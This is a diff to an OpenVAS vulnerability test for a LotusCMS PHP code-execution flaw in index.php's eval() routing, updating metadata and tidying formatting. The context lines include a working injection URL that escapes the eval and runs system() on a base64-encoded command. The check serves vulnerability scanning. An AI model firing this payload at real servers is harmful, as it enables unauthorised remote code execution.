@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_lotuscms_php_code_exec_vuln.nasl 5798 2017-03-30 15:23:49Z cfi $
+# $Id: secpod_lotuscms_php_code_exec_vuln.nasl 11041 2018-08-17 14:03:47Z mmartin $
 #
 # LotusCMS PHP Code Execution Vulnerability
 #
@@ -27,19 +27,20 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.903312");
-  script_version("$Revision: 5798 $");
+  script_version("$Revision: 11041 $");
   script_bugtraq_id(52349);
+  script_cve_id("CVE-2011-0518");
   script_tag(name:"cvss_base", value:"5.1");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-03-30 17:23:49 +0200 (Thu, 30 Mar 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-17 16:03:47 +0200 (Fri, 17 Aug 2018) $");
   script_tag(name:"creation_date", value:"2013-06-27 14:55:42 +0530 (Thu, 27 Jun 2013)");
   script_name("LotusCMS PHP Code Execution Vulnerability");
 
-  script_xref(name : "URL" , value : "http://secunia.com/advisories/43682");
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18565");
-  script_xref(name : "URL" , value : "http://secunia.com/secunia_research/2011-21");
-  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/122161/lotus_eval.py.txt");
-  script_xref(name : "URL" , value : "http://metasploit.org/modules/exploit/multi/http/lcms_php_exec");
+  script_xref(name:"URL", value:"http://secunia.com/advisories/43682");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18565");
+  script_xref(name:"URL", value:"http://secunia.com/secunia_research/2011-21");
+  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122161/lotus_eval.py.txt");
+  script_xref(name:"URL", value:"http://metasploit.org/modules/exploit/multi/http/lcms_php_exec");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (c) 2013 SecPod");
   script_family("Web application abuses");
@@ -47,21 +48,18 @@ if(description)
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
-  script_tag(name : "impact" , value : "Successful exploitation will allow remote attackers to obtain
+  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to obtain
   some sensitive information or execute arbitrary code on the vulnerable Web
   server.
 
   Impact Level: Application");
-  script_tag(name : "affected" , value : "LotusCMS version 3.03, 3.04 and other versions may also be
+  script_tag(name:"affected", value:"LotusCMS version 3.03, 3.04 and other versions may also be
   affected.");
-  script_tag(name : "insight" , value : "Input passed via the 'req' and 'page' parameters to index.php is
+  script_tag(name:"insight", value:"Input passed via the 'req' and 'page' parameters to index.php is
   not properly sanitised in the 'Router()' function in core/lib/router.php before
   being used in an 'eval()' call.");
-  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
-  General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.");
-  script_tag(name : "summary" , value : "This host is running LotusCMS and is prone to php code execution
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
+  script_tag(name:"summary", value:"This host is running LotusCMS and is prone to php code execution
   vulnerability.");
 
   script_tag(name:"qod_type", value:"remote_app");
@@ -75,12 +73,6 @@ include("misc_func.inc");
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
-
-## Variable Initialization
-port = 0;
-dir = "";
-url = "";
-cmds = "";
 
 port = get_http_port(default:80);
 
@@ -106,11 +98,9 @@ foreach dir (make_list_unique("/", "/lcms", "/cms", cgi_dirs(port:port)))
       en_cmd = base64(str:_cmd);
       url_en_cmd = urlencode(str:en_cmd);
 
-      ## Construct attack request
       url = dir + "/index.php?page=index%27)%3B%24%7Bsystem(base64_decode" +
             "(base64_decode(%27"+ url_en_cmd + "%27)))%7D%3B%23";
 
-      ## Try attack and check the response to confirm vulnerability
       if(http_vuln_check(port:port, url:url, check_header:TRUE,
          pattern:cmd))
       {
